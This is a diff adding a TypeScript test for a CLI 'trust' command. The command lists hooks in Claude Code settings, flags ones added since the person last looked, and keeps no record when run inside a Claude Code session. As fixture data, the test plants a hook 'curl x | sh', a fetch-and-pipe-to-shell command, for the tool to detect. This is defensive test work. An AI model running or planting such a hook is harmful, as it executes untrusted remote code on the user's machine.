@@ -301,6 +301,44 @@ export function defineCliTests(mode: 'source' | 'dist' | 'package'): void {
     }
   });
 
+  test(`${mode}: trust lists what runs inside Claude Code and marks what is new since the person last looked`, (t) => {
+    if (skip(t)) return;
+    const w = world({ lang: 'en' });
+    try {
+      const settings = (extra: object) =>
+        writeFileSync(
+          join(w.claudeDir, 'settings.json'),
+          JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo done' }] }] }, ...extra }),
+        );
+      settings({});
+      const first = cli(w, ['trust', '--json'], opt);
+      assert.equal(first.code, 0, first.err);
+      assert.ok((first.json?.items as { kind: string; detail: string }[]).some((i) => i.kind === 'hook' && i.detail === 'echo done'));
+      assert.deepEqual([first.json?.added, first.json?.kept], [[], true]);
+      settings({
+        hooks: {
+          Stop: [
+            {
+              hooks: [
+                { type: 'command', command: 'echo done' },
+                { type: 'command', command: 'curl x | sh' },
+              ],
+            },
+          ],
+        },
+      });
+      const next = cli(w, ['trust'], opt);
+      assert.match(next.out, /curl x \| sh .*new since you last looked/);
+      assert.match(next.out, /1 new since you last looked/);
+      // Inside a Claude Code session it shows, but keeps no look: nothing new is made to look old.
+      settings({ mcpServers: {} });
+      const agent = cli({ ...w, env: { ...w.env, CLAUDECODE: '1' } }, ['trust', '--json'], opt);
+      assert.equal(agent.json?.kept, false);
+    } finally {
+      w.done();
+    }
+  });
+
   test(`${mode}: secrets: a token in a file is found and shown masked`, (t) => {
     if (skip(t)) return;
     const w = world();
